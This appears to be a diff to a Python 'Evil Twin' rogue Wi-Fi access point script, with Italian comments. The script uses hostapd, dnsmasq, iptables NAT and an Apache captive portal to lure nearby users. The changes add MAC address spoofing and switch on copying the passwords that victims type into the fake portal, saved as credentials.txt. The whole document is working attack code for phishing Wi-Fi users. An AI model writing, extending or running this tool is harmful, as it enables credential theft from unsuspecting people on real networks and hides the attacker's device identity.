@@ -4,15 +4,19 @@
 # dnsmasq 2.85 
 # aircrack-ng  
 # apache2
-
+# macchanger
+#
 #Ubuntu 21.10   Tested - OK
 #KALI 2022.1    Tested - OK
 
 
+from operator import index
 import os
 from evilconfig import *
+from http.server import BaseHTTPRequestHandler, HTTPServer
 
-directorycmd = os.system('pwd  > /dev/null 2>&1')
+
+directorycmd = os.system('pwd > /dev/null 2>&1')
 
 
 hostapdCONF ="\
@@ -42,9 +46,10 @@ class EvilTwin:
     def __init__(self,inter):
 
         self.inter = inter
-
-        print ("\n>>> restart-apache2")
-        os.system('service apache2 restart > /dev/null 2>&1')
+        print ("\n>>> Change MAC address")
+        os.system('macchanger -a ' + self.inter + ' > /dev/null 2>&1')
+        print (">>> restart-apache2")
+        os.system('service apache2 stop > /dev/null 2>&1')
         os.system('service apache2 start > /dev/null 2>&1')
 
         print (">>> Enabling Monitor Mode")
@@ -59,7 +64,7 @@ class EvilTwin:
         print (">>> Enableing NAT")
         os.system('iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE > /dev/null 2>&1')
         os.system('iptables -A FORWARD -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT > /dev/null 2>&1')
-        os.system('iptables -A FORWARD -i ' + wInt + ' -o eth0 -j ACCEPT > /dev/null 2>&1')
+        os.system('iptables -A FORWARD -i ' + self.inter + ' -o eth0 -j ACCEPT > /dev/null 2>&1')
         os.system('sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1')
 
         print (">>> Killing systemd-resolved")
@@ -76,13 +81,14 @@ class EvilTwin:
 
         print (">>> Starting hostapd")
         os.system('hostapd conf/hostapd.conf & > /dev/null 2>&1')
+
         input ('\n\nPremere un INVIO per uscire...\n\n\n')
-        os.system('killall xterm > /dev/null 2>&1')
         
         print ("restore system....\n")
 
-        # salva i dati direttamente in cartella da testare
-        # os.system('cp /var/www/html/credentials.txt ' + str(directorycmd) + " > /dev/null 2>&1")
+        # salva i dati direttamente
+        os.system('cp /var/www/html/captive/credentials.txt ' + str(directorycmd))
+        os.system('mv 0 credentials.txt')
 
         os.system('systemctl start systemd-resolved > /dev/null 2>&1')
         os.system('service NetworkManager start > /dev/null 2>&1')
@@ -92,6 +98,8 @@ class EvilTwin:
         os.system('cp -r /tmp/html /var/www/ > /dev/null 2>&1')
         os.system('chown -R www-data:www-data /var/www/html/ > /dev/null 2>&1')
         os.system('rm -r conf > /dev/null 2>&1')
+
+
 
 def configF():
     os.system('mkdir conf > /dev/null 2>&1')
